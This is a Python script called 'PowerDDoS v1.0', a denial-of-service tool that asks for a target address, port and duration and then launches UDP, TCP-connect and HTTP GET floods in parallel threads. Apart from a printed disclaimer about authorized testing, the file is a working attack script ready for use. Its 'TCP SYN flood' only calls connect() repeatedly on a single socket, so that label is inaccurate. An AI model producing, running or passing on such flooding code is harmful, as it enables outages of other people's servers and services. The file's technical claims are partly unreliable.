import socket
import random
import threading
import time
import sys
import os

# Clear terminal
os.system("clear")
os.system("figlet PowerDDoS v1.0")

# Info Print
print("PowerDDoS - Educational Testing Tool")
print("Use for authorized testing only. Make sure to have permission!")

# Input target IP, port, and attack duration
ip = input("Enter Target IP/Domain: ")
try:
    port = int(input("Enter Target Port (e.g., 80, 443): "))
except ValueError:
    print("Invalid port! Exiting...")
    sys.exit()

try:
    dur = int(input("Enter Attack Duration (seconds): "))
except ValueError:
    print("Invalid duration! Exiting...")
    sys.exit()

# Threaded UDP Flood Function
def udp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = random._urandom(1024)  # Random message size
    timeout = time.time() + dur
    packet_count = 0

    while time.time() < timeout:
        s.sendto(message, (ip, port))
        packet_count += 1
        print(f"[UDP] Sent {packet_count} packets")
    
    s.close()

# Threaded TCP SYN Flood Function
def tcp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    timeout = time.time() + dur
    packet_count = 0

    while time.time() < timeout:
        try:
            s.connect((ip, port))
            packet_count += 1
            print(f"[TCP SYN] Sent SYN packet {packet_count}")
        except:
            pass
    
    s.close()

# Threaded HTTP GET Flood Function
def http_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    message = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
    timeout = time.time() + dur
    packet_count = 0

    while time.time() < timeout:
        try:
            s.connect((ip, port))
            s.sendall(message)
            packet_count += 1
            print(f"[HTTP GET] Sent {packet_count} GET requests")
        except:
            pass
    
    s.close()

# Thread management and start attacks
def start_attacks():
    udp_thread = threading.Thread(target=udp_flood)
    tcp_thread = threading.Thread(target=tcp_flood)
    http_thread = threading.Thread(target=http_flood)

    udp_thread.start()
    tcp_thread.start()
    http_thread.start()

    udp_thread.join()
    tcp_thread.join()
    http_thread.join()

# Start attack
if __name__ == "__main__":
    print("Attacks starting...")
    start_attacks()
    print("Attack completed.")
